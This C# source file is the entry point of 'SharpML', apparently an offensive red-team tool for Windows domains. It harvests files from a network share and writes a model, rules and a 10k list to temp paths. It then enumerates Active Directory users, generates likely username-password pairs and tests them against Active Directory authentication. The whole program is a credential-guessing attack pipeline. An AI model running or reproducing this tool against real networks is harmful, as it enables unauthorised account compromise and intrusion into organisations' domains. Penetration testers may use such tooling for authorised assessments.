using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;

namespace SharpML
{
    class Program
    {
        private static string _share_unc_path = null;

        

        static void Main(string[] args)
        {
            OptionSet options = new OptionSet()
                .Add("u=|uncsharepath=", h => _share_unc_path = h);

            options.Parse(args);

            if (_share_unc_path == null)
            {
                Console.WriteLine("Please enter an option");
                Environment.Exit(0);
            }
            Console.WriteLine("\r\n ---------- 1. Harvesting data from fileshare ----------\r\n");
            dataMiner.ProcessDirectory(_share_unc_path);

            string algo_file = GetRandomString();
            string rules_file =  GetRandomString();
            string tenk = GetRandomString();
            string mod_data = (System.Environment.GetEnvironmentVariable("TEMP") + @"\model_data.txt");
            DropDependencies drop = new DropDependencies();

            string dropped_algo = drop.DropModeltoDisk(algo_file);
            string dropped_rules = drop.DropRulestoDisk(rules_file);
            string dropped_10k = drop.Drop10ktoDisk(tenk);
            Console.WriteLine("\r\n ---------- 2. Successfully dropped dependencies ----------\r\n");
                     


            string ad_user_txt_path = Path.GetTempPath() + GetRandomString() + ".txt";
            //Console.WriteLine(ad_user_txt_path);
            List<string> ADuserNames = ADObjects.ADuser();
            try
            {
                using (StreamWriter outputFile = new StreamWriter(ad_user_txt_path))
                {
                    foreach (string line in ADuserNames)
                        outputFile.WriteLine(line);

                }
                Console.WriteLine("\r\n ---------- 3. Active Directory user list generated ----------\r\n");
            }
            catch
            {
                Console.WriteLine("\r\n ---------- failed to create Active Directory user list ----------\r\n");
                Environment.Exit(1);
            }
            Console.WriteLine("\r\n ---------- 4. Piping data to SharpML algorithm ----------\r\n");
            string data_to_process = PerformModelWrapperInterop.PerformDataPiping(dropped_rules, mod_data, ad_user_txt_path, dropped_algo, "false");

            if (data_to_process != null)
            {

                Console.WriteLine("\r\n ---------- 5. Potential user password combinations ----------\r\n");
                Console.WriteLine(data_to_process);
                Console.WriteLine("\r\n ---------- 6. Performing Active Directory authentication test ----------\r\n");


                PairUPProcessing.RunAuthCheck(data_to_process);
                //foreach(string user in users_found)
                //{
                //    Console.WriteLine(user);
                //}
            }
            else
            {
                Console.WriteLine("\r\n ---------- SharpML failed to find any password :( Try another network share ----------\r\n");
                Environment.Exit(1);
            }




        }

        public static string GetRandomString()
        {
            string path = Path.GetRandomFileName();
            path = path.Replace(".", ""); // Remove period.
            return path;
        }
    }
}
